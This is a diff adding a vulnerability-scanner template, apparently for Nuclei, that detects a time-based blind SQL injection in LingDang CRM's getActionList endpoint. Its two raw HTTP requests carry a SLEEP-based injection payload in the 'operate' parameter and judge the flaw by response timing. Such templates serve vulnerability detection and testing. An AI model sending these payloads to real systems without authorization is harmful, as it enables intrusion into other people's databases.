@@ -1,0 +1,50 @@
+id: poc-yaml-51mis-crm-getactionList-operate-sqli
+info:
+  name: LingDang CRM getActionList operate SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Exploits an SQL injection vulnerability in the `getActionList` operation of LingDang CRM.
+http:
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&operate=' AND (SELECT 3408 FROM (SELECT(SLEEP({{t1}})))HtiS)-- cbVc--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"result"'
+          - '"code":1'
+          - '"msg":"success"'
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= {{t2}} && duration <= {{t3}}"
+          - "!contains(body, '<')"
+  - raw:
+      - |
+        GET /crm/WeiXinApp/marketing/index.php?module=Users&action=getActionList&operate=' AND (SELECT 3408 FROM (SELECT(SLEEP({{t4}})))HtiS)-- cbVc--+ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"result"'
+          - '"code":1'
+          - '"msg":"success"'
+        part: body
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "duration >= {{t5}} && duration <= {{t6}}"
+          - "!contains(body, '<')"
+variables:
+  t1: "{{rand_int(3, 5)}}"
+  t2: "{{to_number(t1)*2}}"
+  t3: "{{to_number(t2)+2}}"
+  t4: "{{rand_int(1, 3)}}"
+  t5: "{{to_number(t4)*2}}"
+  t6: "{{to_number(t5)+2}}"
